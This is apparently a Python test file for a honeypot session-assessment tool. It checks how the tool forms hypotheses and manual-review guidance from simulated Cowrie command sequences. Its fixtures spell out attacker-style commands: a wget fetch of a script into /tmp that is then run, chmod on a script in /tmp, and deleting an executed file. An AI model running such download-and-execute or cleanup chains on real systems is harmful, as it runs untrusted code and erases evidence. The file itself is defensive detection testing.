"""Bounded H1/H2 hypotheses and G1/G2 manual guidance integration."""

from __future__ import annotations

from production.reporting.response_guidance_v3 import validate_response_guidance_v3
from production.reporting.session_assessment_v4 import validate_session_assessment_v4
from tests.test_cross_family_relationship_evaluation import _build
from tests.test_transfer_family_independent_evaluation import _evaluate


def _case(name: str, commands: list[tuple[str, str]]):
    facts, report = _build({"case_id": name, "events": commands})
    assert validate_session_assessment_v4(report) == []
    guidance = report["response_guidance_v3"]
    assert validate_response_guidance_v3(guidance) == []
    return facts, report, guidance


def _actions(guidance: dict, rule_id: str) -> list[dict]:
    return [action for action in guidance["advisory_actions"]
            if action["rule_id"] == rule_id]


def test_h1_is_hypothesis_only_and_g1_groups_same_path() -> None:
    _, report, guidance = _case("new-h1-g1", [
        ("printf demo > /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
    ])
    assert len(report["hypothesis_sets"]) == 1
    assert len(report["hypothesis_sets"][0]["hypotheses"]) == 2
    assert all(item["finding_type"] != "possible_file_preparation"
               for item in report["behavioral_findings"])
    actions = _actions(guidance, "review-same-path-file-change")
    assert len(actions) == 1
    assert len(actions[0]["evidence_refs"]) >= 2
    assert actions[0]["requires_manual_approval"] is True
    assert actions[0]["safe_to_auto_execute"] is False
    assert actions[0]["execution_integration"] == "not_implemented"


def test_h1_disappears_when_same_path_execution_is_observed() -> None:
    _, report, guidance = _case("new-h1-completed", [
        ("printf demo > /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
        ("/tmp/demo.sh", "success"),
    ])
    assert report["hypothesis_sets"] == []
    assert len(_actions(guidance, "review-same-path-file-change")) == 1


def test_h2_remains_unconfirmed_not_a_trusted_transfer_finding() -> None:
    _, report, guidance = _case("new-h2", [
        ("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success"),
        ("/tmp/demo.sh", "success"),
    ])
    assert len(report["hypothesis_sets"]) == 1
    hypotheses = report["hypothesis_sets"][0]["hypotheses"]
    assert len(hypotheses) == 2
    assert "pre-existing file" in hypotheses[1]["statement"]
    assert not any(item["finding_type"] == "possible_use_after_unconfirmed_transfer"
                   for item in report["behavioral_findings"])
    assert _actions(guidance, "review-same-path-execution-delete") == []


def test_direct_transfer_event_suppresses_unconfirmed_h2() -> None:
    _payload, _facts, _selection, report = _evaluate({
        "case_id": "new-direct-transfer",
        "events": [
            {"kind": "command", "command": "wget https://example.invalid/demo.sh -O /tmp/demo.sh", "outcome": "success"},
            {"kind": "transfer", "eventid": "cowrie.session.file_download", "path": "/tmp/demo.sh",
             "url": "https://example.invalid/demo.sh", "digest": "a" * 64},
            {"kind": "command", "command": "/tmp/demo.sh", "outcome": "success"},
        ],
    })
    scopes = {item["scope"] for item in report["hypothesis_sets"]}
    assert "bounded_cowrie_unverified_remote_content" not in scopes
    assert "bounded_cowrie_download_then_execution_attempt" in scopes


def test_g2_requires_supported_same_path_order_and_success() -> None:
    _, report, guidance = _case("new-g2", [
        ("/tmp/demo.sh", "success"),
        ("rm /tmp/demo.sh", "success"),
    ])
    assert report["hypothesis_sets"] == []
    actions = _actions(guidance, "review-same-path-execution-delete")
    assert len(actions) == 1
    assert len(actions[0]["evidence_refs"]) >= 2
    assert actions[0]["matched_predicates"][0]["predicate"] == "supported_same_path_execution_delete_sequence"
    assert actions[0]["requires_manual_approval"] is True
    assert actions[0]["safe_to_auto_execute"] is False

    for index, commands in enumerate((
        [("/tmp/demo.sh", "success"), ("rm /tmp/other.sh", "success")],
        [("rm /tmp/demo.sh", "success"), ("/tmp/demo.sh", "success")],
        [("/tmp/demo.sh", "failure"), ("rm /tmp/demo.sh", "success")],
    )):
        _, _, negative = _case(f"new-g2-negative-{index}", commands)
        assert _actions(negative, "review-same-path-execution-delete") == []


def test_failed_or_different_path_file_change_does_not_invent_h1() -> None:
    for index, commands in enumerate((
        [("printf demo > /tmp/demo.sh", "failure"), ("chmod 700 /tmp/demo.sh", "success")],
        [("printf demo > /tmp/demo.sh", "success"), ("chmod 700 /tmp/other.sh", "success")],
    )):
        _, report, guidance = _case(f"new-h1-negative-{index}", commands)
        assert report["hypothesis_sets"] == []
        assert all(len(action["evidence_refs"]) >= 1
                   for action in _actions(guidance, "review-same-path-file-change"))
